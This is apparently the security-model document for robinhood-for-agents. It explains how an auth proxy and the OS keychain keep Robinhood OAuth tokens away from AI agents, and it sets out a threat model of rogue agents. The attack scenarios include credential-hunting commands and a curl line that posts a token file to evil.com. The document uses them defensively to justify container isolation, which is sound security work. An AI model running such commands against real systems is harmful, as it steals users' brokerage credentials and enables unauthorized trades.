# Security Model

This document describes how robinhood-for-agents protects Robinhood OAuth tokens and what each deployment model defends against.

## What we store

A single JSON blob containing:

| Field | Purpose |
|-------|---------|
| `access_token` | Bearer token for API calls (~8.5-day expiry) |
| `refresh_token` | Used with `device_token` to get a new access token |
| `device_token` | UUID binding the session to a device |

Anyone who has all three can trade on the user's Robinhood account.

## Architecture: auth proxy

All Robinhood API calls go through a local auth proxy that injects the Bearer token. The proxy is the single point of token access:

```
┌─── Host (or local machine) ──────────────────┐
│                                               │
│  OS Keychain ─► proxy.ts (127.0.0.1:3100)    │
│  ├── session-tokens (RH OAuth)               │
│  └── proxy-token (access control)            │
│                    │                          │
│                    ▼                          │
│  Validates X-Proxy-Token header              │
│  Injects Authorization: Bearer <token>        │
│  Forwards to api.robinhood.com               │
│  Strips tokens from responses                 │
│  Handles token refresh on 401                │
│                                               │
└───────────────────────────────────────────────┘
        ▲
        │  HTTP + X-Proxy-Token header
        │
┌───────┴───────────────────────────────────────┐
│  Client (same host or Docker container)       │
│  Knows: proxy URL + proxy token               │
│  Sends requests to proxy path prefixes:       │
│    /rh/*     → api.robinhood.com              │
│    /nummus/* → nummus.robinhood.com           │
└───────────────────────────────────────────────┘
```

### Proxy access control (X-Proxy-Token)

The proxy generates a per-session shared secret (random UUID) on startup that gates all non-health endpoints. Every request must include an `X-Proxy-Token` header matching this value; requests without it receive a 403.

**Where the proxy token is stored:**

| Context | Storage | How the client gets it |
|---------|---------|----------------------|
| In-process (MCP server, scripts) | In-memory (`activeServer.token`) | `startProxy()` returns it directly |
| Cross-process (standalone `proxy` command) | OS keychain (`Bun.secrets`, key: `"proxy-token"`) | `ensureProxy()` reads from keychain on discovery |
| Docker | `ROBINHOOD_PROXY_TOKEN` env var (set by user) | Proxy uses env var instead of random UUID; container sets same value |

The proxy token is stored in the same OS keychain as RH tokens -- same encryption, same access controls. We rejected temp files because any same-user process could read them, which would be a security downgrade from the keychain.

## Threat model

### What we protect against today

- **Disk theft / offline access** -- tokens and proxy secrets are encrypted at rest in the OS keychain (macOS Keychain Services, Linux libsecret)
- **Other OS users** -- keychain items are scoped to the owning user
- **Unauthorized proxy access** -- non-health proxy endpoints require a shared secret (`X-Proxy-Token`) stored in the OS keychain, preventing other processes from using the proxy without keychain access
- **Network interception** -- all API calls use TLS; redirect validation prevents token leakage to untrusted hosts
- **Accidental exposure in logs** -- token redaction layer scrubs `access_token`, `refresh_token`, and `device_token` from all error messages and LLM-visible output
- **Container breakout (Docker)** -- tokens never enter the container; the proxy is the only bridge

### What we do NOT protect against today

- **Rogue agents with shell access on the same host** -- `Bun.secrets` does not use per-access biometric authentication (`kSecAccessControlUserPresence` on macOS). Once the user grants `bun` keychain access, any process running `bun` as that user can read tokens silently. On Linux, GNOME Keyring unlocks at login and stays open for the session.

This is a fundamental property of the current OS keychain model, not a bug in this project.

## Attack scenarios

### Scenario A: Plaintext token file in a container

```bash
$ find / -name "*.json" -exec grep -l "access_token" {} \;
/secrets/robinhood-tokens.json

$ cat /secrets/robinhood-tokens.json
{"access_token":"eyJ...","refresh_token":"abc...","device_token":"uuid..."}

# Exfiltrate -- attacker trades from anywhere, forever
$ curl -X POST https://evil.com/steal -d @/secrets/robinhood-tokens.json
```

**Result**: Full credential theft. One command.

### Scenario B: Encrypted token file with key in env var

```bash
$ cat /secrets/robinhood-tokens.json
{"v":1,"salt":"ab12..","iv":"cd34..","tag":"ef56..","ct":"encrypted-blob"}
# Encrypted. But check the environment:

$ env | grep ROBINHOOD
ROBINHOOD_ENCRYPTION_KEY=a1b2c3d4e5f6...
ROBINHOOD_TOKENS_FILE=/secrets/robinhood-tokens.json

# Or just call the library directly:
$ bun -e "
  import { loadTokens } from 'robinhood-for-agents/client/token-store';
  console.log(JSON.stringify(await loadTokens()));
"
{"access_token":"eyJ...","refresh_token":"abc...","device_token":"uuid..."}
```

**Result**: Same as plaintext -- one extra step. The decryption key sits in the same environment as the ciphertext.

### Scenario C: Auth proxy -- tokens on host only

```bash
$ find / -name "*.json" -exec grep -l "access_token" {} \;
# (nothing)

$ env | grep ROBINHOOD
ROBINHOOD_API_PROXY=http://host.docker.internal:3100
ROBINHOOD_PROXY_TOKEN=<user-chosen-uuid>
# Proxy token grants API access through the proxy, but NOT raw RH tokens.
# No access_token, refresh_token, or device_token in the container.

$ grep -r "eyJ" / 2>/dev/null
# (nothing -- no JWTs anywhere in the container)

$ bun -e "console.log(await Bun.secrets.get('robinhood-for-agents','session-tokens'))"
# null (no keychain in Docker)

# The proxy lets you call the API (with the proxy token), but never exposes the RH token:
$ curl -H "X-Proxy-Token: $ROBINHOOD_PROXY_TOKEN" \
    http://host.docker.internal:3100/rh/positions/?nonzero=true
{"results": [...]}

# Without the proxy token, all non-health endpoints are rejected:
$ curl http://host.docker.internal:3100/rh/positions/?nonzero=true
{"error":"Missing or invalid proxy token"}   # 403

$ curl http://host.docker.internal:3100/.tokens
# 404 -- the proxy does not expose raw tokens
```

**Result**: No credential theft possible. The container has a proxy token that lets it make API calls, but the proxy token cannot be used to extract or reconstruct the underlying RH OAuth tokens. Kill the proxy to instantly revoke all access.

## Security tiers

| Tier | Setup | Token location | Rogue agent risk |
|------|-------|---------------|-----------------|
| 1. Keychain + proxy (default) | Local, auto-started proxy | OS keychain | Agent reads keychain via shell -- same user, same privileges |
| 2. Auth proxy (Docker) | Host proxy + agent in container | **Host keychain only** -- nothing in the container | **Exfiltration blocked.** Agent can only make API calls through the proxy (rate-limited, audited, killable) |

### Why Docker + auth proxy is the strongest practical option

Docker provides an **isolation boundary** between the host (where tokens live in the keychain) and the container (where the agent runs). The proxy is the only bridge, and it never exposes raw tokens. The agent can abuse the proxy to make API calls, but it cannot steal the token for use elsewhere. And you can kill the proxy to instantly revoke all container access.

Without Docker (or another sandbox), the agent and the keychain share the same user context -- no amount of encryption or indirection prevents a same-user process from reading the keychain.

## Best practices

### Docker deployments

- **Always** use the auth proxy -- never put RH tokens inside the container
- Set two env vars in the container: `ROBINHOOD_API_PROXY` (proxy URL) and `ROBINHOOD_PROXY_TOKEN` (proxy access key)
- The proxy runs on the host where the keychain is accessible
- Stop the proxy to immediately revoke all container access

### Local deployments

- The proxy auto-starts in-process when the MCP server launches
- OS keychain is the baseline -- no tokens on disk, no env vars
- Agent permission models (e.g., Claude Code approval prompts) provide an additional layer

### Never do this

- **Never store RH tokens as plaintext files** -- one `cat` command exposes everything
- **Never pass RH tokens as env vars** -- visible via `docker inspect`, `/proc/<pid>/environ`, and orchestrator logs
- **Never store encryption keys alongside encrypted files** -- if an attacker can read the file, they can almost certainly read the env var too

### Why the proxy token is safe as an env var

`ROBINHOOD_PROXY_TOKEN` is different from RH OAuth tokens (`access_token`, `refresh_token`, `device_token`):

- **Not a credential.** It's a revocable session key that only grants access *through* the proxy. It cannot be used to extract or reconstruct the underlying RH tokens.
- **Scoped and ephemeral.** A new token is generated each time the proxy starts. Kill the proxy and the token is instantly worthless.
- **No lateral movement.** An attacker who obtains the proxy token can make API calls through the proxy, but cannot use it anywhere else (e.g., directly against `api.robinhood.com`).
- **Acceptable risk.** `docker inspect` visibility is the standard trade-off for any Docker service that requires authentication to an external service. The alternative (mounting a secret file) has the same threat profile with more operational complexity.

## Why not encrypted files?

Encrypted files seem like a reasonable middle ground, but they fail the core threat model:

1. The decryption key must be available at runtime (env var, mounted secret, etc.)
2. A rogue agent with shell access can read env vars as easily as files
3. The agent can also call `loadTokens()` directly, which handles decryption internally
4. **Result**: encryption adds complexity without meaningful security improvement when the attacker has code execution in the same environment

The auth proxy solves this by keeping the token in a **different security domain** (the host) that the containerized agent physically cannot reach.
